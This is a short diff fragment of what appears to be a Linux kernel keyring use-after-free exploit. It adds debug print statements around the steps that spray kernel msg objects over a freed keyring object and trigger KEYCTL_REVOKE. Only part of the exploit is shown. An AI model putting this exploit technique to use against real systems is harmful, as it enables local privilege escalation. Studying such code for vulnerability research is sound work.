@@ -118,7 +118,8 @@ struct { long mtype;
         }
     }
 
-
+    puts("finished increfing\n");
+    puts("forking...");
     /* allocate msg struct in the kernel rewriting the freed keyring object */
     for (i=0; i<64; i++) {
         pid = fork();
@@ -144,10 +145,11 @@ struct { long mtype;
         }
     }
    
-
+    puts("finished forking\n");
     sleep(5);
 
     /* call userspace_revoke from kernel */
+    puts("caling revoke...\n");
     if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
         perror("keyctl_revoke");
     }
